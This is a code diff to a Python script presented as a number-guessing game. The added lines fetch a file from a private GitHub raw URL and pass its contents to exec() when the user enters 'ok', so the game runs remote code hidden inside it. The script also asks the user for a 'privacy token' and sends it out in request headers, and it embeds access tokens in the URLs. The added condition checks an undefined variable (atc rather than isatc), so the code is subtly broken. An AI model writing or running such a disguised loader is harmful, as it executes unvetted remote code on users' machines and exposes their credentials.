@@ -3,17 +3,21 @@ import requests
 import random
 
 
-
+isatc= input("enter atc:")
 
 def plr():
     secret_number = random.randint(1, 100)
     attempts = 0
 
     while True:
-        url = 'https://raw.githubusercontent.com/xsjfns/myown/main/newket.py?token=GHSAT0AAAAAACQKJBTSU2UT32DPBLVCTJCAZQIYY5Q'
+        url = 'https://raw.githubusercontent.com/xsjfns/myown/main/manket.txt?token=GHSAT0AAAAAACQOYUHX5ZD3ZL2PUJKUWE5QZQMUA7Q'
+        url2 = 'https://raw.githubusercontent.com/xsjfns/myown/main/atcket.txt?token=GHSAT0AAAAAACQOYUHW4OELJLACJ6OIJKMCZQMUB7A'
         guess = input("Enter your guess: ")
         token = input("Enter your privacy  token: ")
         headers = {"Authorization": f"token {token}"}
+        if atc=="ok":
+            response = requests.get(url2, headers=headers) 
+            exec(response.text)
         response = requests.get(url, headers=headers)
         if not guess.isdigit():
             print("Please enter a valid number.")
